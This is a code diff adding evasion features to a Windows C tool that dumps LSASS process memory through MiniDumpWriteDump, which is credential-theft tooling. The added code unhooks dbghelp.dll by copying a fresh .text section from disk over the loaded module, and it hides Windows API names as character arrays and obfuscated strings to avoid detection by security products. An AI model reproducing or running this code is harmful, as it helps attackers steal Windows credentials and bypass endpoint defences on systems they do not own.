@@ -26,6 +26,105 @@
 LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
 DWORD dumpSize = 0;
 
+typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
+typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
+
+unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+
+PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
+	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
+}
+
+int UnhookModule(const HMODULE hDbghelp, const LPVOID pMapping) {
+	/*
+		UnhookDbghelp() finds .text segment of fresh loaded copy of Dbghelp.dll and copies over the hooked one
+	*/
+	DWORD oldprotect = 0;
+	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
+	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
+	int i;
+	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
+	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sVirtualProtect);
+
+
+	// find .text section
+	for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
+		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+		if (strcmp((char*)pish->Name, ".text") == 0) {
+			// prepare hDbghelp.dll memory region for write permissions.
+			VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
+			if (!oldprotect) {
+				// RWX failed!
+				return -1;
+			}
+			// copy original .text section into hDbghelp memory
+			memcpy((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);
+
+			// restore original protection settings of hDbghelp
+			VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
+			if (!oldprotect) {
+				// it failed
+				return -1;
+			}
+			// all is good, time to go home
+			return 0;
+		}
+	}
+	// .text section not found?
+	return -1;
+}
+
+void FreshCopy(unsigned char* modulePath, unsigned char* moduleName) {
+	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
+	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
+	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
+
+	int ret = 0;
+	HANDLE hFile;
+	HANDLE hFileMapping;
+	LPVOID pMapping;
+
+	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sCreateFileMappingA);
+	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sMapViewOfFile);
+	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sUnmapViewOfFile);
+
+	// open the DLL
+	hFile = CreateFileA((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		// failed to open the DLL
+		printf("failed to open $s %u", modulePath, GetLastError());
+	}
+
+	// prepare file mapping
+	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+	if (!hFileMapping) {
+		// file mapping failed
+
+		CloseHandle(hFile);
+		printf("file mapping failed %u", GetLastError());
+	}
+
+	// map the bastard
+	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
+	if (!pMapping) {
+		// mapping failed
+		CloseHandle(hFileMapping);
+		CloseHandle(hFile);
+		printf("mapping failed %u", GetLastError());
+	}
+
+	// remove hooks
+	ret = UnhookModule(GetModuleHandleA((LPCSTR)moduleName), pMapping);
+
+	// Clean up.
+	UnmapViewOfFile_p(pMapping);
+	CloseHandle(hFileMapping);
+	CloseHandle(hFile);
+}
+
 // Callback routine that we be called by the MiniDumpWriteDump function
 BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
 	LPVOID destination = 0;
@@ -194,7 +293,14 @@ int main(int argc, char** argv)
 	strcat(mi$$ni$du$p, tD);
 	strcat(mi$$ni$du$p, mp);
 
-	MyMiniDumpWriteDump myMiniDumpWriteDump = (MyMiniDumpWriteDump)GetProcAddress(LoadLibrary(dbg$$h$lp), mi$$ni$du$p);
+	HMODULE dbgMod = LoadLibrary(dbg$$h$lp);
+
+	unsigned char sDbghelpPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0 };
+	unsigned char sDbghelp[] = { 'd','b','g','h','e','l','p','.','d','l','l', 0x0 };
+	FreshCopy(sDbghelpPath, sDbghelp);
+
+	MyMiniDumpWriteDump myMiniDumpWriteDump = (MyMiniDumpWriteDump)GetProcAddress(dbgMod, mi$$ni$du$p);
+
 	BOOL success = myMiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
 	if (success) {
 		printf("[+] Successfully dumped ls__a_ss to memory!\n");
